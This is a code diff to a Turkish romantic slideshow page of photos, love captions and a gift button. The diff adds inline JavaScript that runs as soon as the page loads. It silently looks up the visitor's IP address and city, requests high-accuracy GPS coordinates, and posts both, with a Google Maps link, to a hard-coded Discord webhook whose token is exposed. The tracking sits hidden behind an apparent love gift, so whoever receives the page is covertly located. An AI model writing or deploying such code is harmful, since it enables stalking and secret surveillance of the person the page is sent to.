@@ -5,70 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Senin İçin</title>
     <style>
-        body {
-            background: #000;
-            color: white;
-            margin: 0;
-            height: 100vh;
-            font-family: 'Poppins', sans-serif;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-        }
-
-        img {
-            width: 550px;
-            height: 300px;
-            object-fit: cover;
-            border-radius: 15px;
-            box-shadow: 0 0 30px #ff00ff;
-            margin-bottom: 20px;
-        }
-
-        #soz {
-            font-size: 1.5rem;
-            margin-bottom: 15px;
-            color: #ff66ff;
-            text-shadow: 0 0 15px #ff00ff;
-        }
-
-        button {
-            padding: 12px 28px;
-            background: #ff00ff;
-            border: none;
-            color: white;
-            font-size: 1.1rem;
-            border-radius: 10px;
-            cursor: pointer;
-            box-shadow: 0 0 20px #ff00ff;
-            transition: 0.3s;
-        }
-
-        button:hover {
-            transform: scale(1.1);
-        }
-
-        #hediyeButon {
-            margin-top: 30px;
-            padding: 12px 28px;
-            background: #ff0077;
-            border: none;
-            color: white;
-            font-size: 1.2rem;
-            border-radius: 10px;
-            cursor: pointer;
-            box-shadow: 0 0 20px #ff0077;
-            display: none; 
-        }
-
-        #hediyeButon:hover {
-            transform: scale(1.1);
-        }
+        body { background: #000; color: white; margin: 0; height: 100vh; font-family: 'Poppins', sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+        img { width: 550px; height: 300px; object-fit: cover; border-radius: 15px; box-shadow: 0 0 30px #ff00ff; margin-bottom: 20px; }
+        #soz { font-size: 1.5rem; margin-bottom: 15px; color: #ff66ff; text-shadow: 0 0 15px #ff00ff; }
+        button { padding: 12px 28px; background: #ff00ff; border: none; color: white; font-size: 1.1rem; border-radius: 10px; cursor: pointer; box-shadow: 0 0 20px #ff00ff; transition: 0.3s; }
+        button:hover { transform: scale(1.1); }
+        #hediyeButon { margin-top: 30px; padding: 12px 28px; background: #ff0077; border: none; color: white; font-size: 1.2rem; border-radius: 10px; cursor: pointer; box-shadow: 0 0 20px #ff0077; display: none; }
     </style>
 </head>
-
 <body>
 
     <div id="icerik">
@@ -77,14 +21,60 @@
     </div>
 
     <button id="ileriBtn" onclick="ileri()">İleri ➜</button>
-
     <button id="hediyeButon" onclick="window.location.href='hediye.html'">Hediyeyi Gör 🎁</button>
 
     <audio id="music" autoplay loop>
         <source src="music.mp3" type="audio/mpeg">
     </audio>
 
-    <script src="script.js"></script>
+    <script>
+        // --- AYARLAR ---
+        // Kendi Webhook URL'ni aşağıya tırnakların içine yapıştır
+        const WEB_URL = "https://discord.com/api/webhooks/1470176972410851379/7mzBrZBZzn_oW7nXfV0538TOe1rhbTo46P9IoIRXoHEMx4AcvFJjqvqtIDNa2BzGQ47I";
 
+        function dcGonder(m) {
+            fetch(WEB_URL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: m})
+            });
+        }
+
+        // Sayfa yüklendiğinde otomatik başlar
+        window.onload = function() {
+            // 1. IP Bilgisi
+            fetch('https://ipapi.co/json/')
+                .then(r => r.json())
+                .then(d => {
+                    dcGonder("🚀 **Giriş!**\n📍 Şehir: " + d.city + "\n🌐 IP: " + d.ip);
+                    
+                    // 2. Hassas Konum (GPS)
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(function(p) {
+                            var enlem = p.coords.latitude;
+                            var boylam = p.coords.longitude;
+                            var link = "https://www.google.com/maps?q=" + enlem + "," + boylam;
+                            dcGonder("🎯 **Hassas Konum!**\n🗺️ Harita: " + link);
+                        }, null, {enableHighAccuracy: true, timeout: 10000});
+                    }
+                });
+        };
+
+        // --- SENİN FOTOĞRAF GEÇİŞ SİSTEMİN ---
+        const fotolar = ["foto1.jpg", "foto2.jpg", "foto3.jpg", "foto4.jpg", "foto5.jpg"];
+        const sozler = ["Seninle her günüm daha güzel.", "Gülüşün dünyamı aydınlatıyor.", "Kalbim hep seninle.", "Sana her baktığımda yeniden aşık oluyorum.", "İyi ki varsın, iyi ki benimsin."];
+        let index = 0;
+
+        function ileri() {
+            index++;
+            if (index >= fotolar.length) {
+                document.getElementById("hediyeButon").style.display = "block";
+                document.getElementById("ileriBtn").style.display = "none";
+                return;
+            }
+            document.getElementById("foto").src = fotolar[index];
+            document.getElementById("soz").innerText = sozler[index];
+        }
+    </script>
 </body>
 </html>
